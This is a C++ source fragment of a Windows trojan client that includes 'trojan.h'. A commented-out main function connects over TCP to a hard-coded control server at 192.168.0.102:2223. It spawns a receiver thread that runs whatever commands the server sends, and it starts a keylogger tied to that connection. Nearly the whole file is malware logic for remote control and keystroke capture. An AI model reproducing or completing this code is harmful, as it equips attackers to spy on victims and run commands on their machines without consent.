
#include "stdafx.h"
#include <winsock2.h>
#include "trojan.h"
#pragma comment(lib,"ws2_32.lib")


//void receiver(Client * client);

/*
int _tmain(int argc, _TCHAR* argv[])
{
	Client client = Client(2223, "192.168.0.102");
	Client * p_client = &client; 
	WSADATA wsaData;
	int iResult;
	sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(client.port);
	addr.sin_addr.S_un.S_addr = inet_addr(client.ip);


	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (iResult)
	{
		std::cout << "ERROR! WSA startup failed";
		Sleep(1000);
		return 0;
	}


	client.sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (client.sock == INVALID_SOCKET)
	{
		std::cout << "ERROR! Invalid socket";
		Sleep(1000);
		return 0;
	}

	iResult = connect(client.sock, (SOCKADDR*)&addr, sizeof(sockaddr_in));

	if (iResult)
	{
		std::cout << "ERROR! Connect failed %u" << WSAGetLastError();
		Sleep(5000);
		return 0;
	}
	if(DEBUG)
		std::cout << "Connected!\n";


	std::thread t_receiver(receiver, p_client);
	t_receiver.detach();

	//client.sender("hi!");
	Keylogger k;
	k.start(p_client);
}*/

/*Recieve commands from server*//*
void receiver(Client * client)
{
	char chunk[200];
	while (1)
	{
		recv(client->sock, chunk, 200, 0);
		std::string str(chunk);
		Command cmd = Command(str);
		cmd.execCommand();
	}
}*/


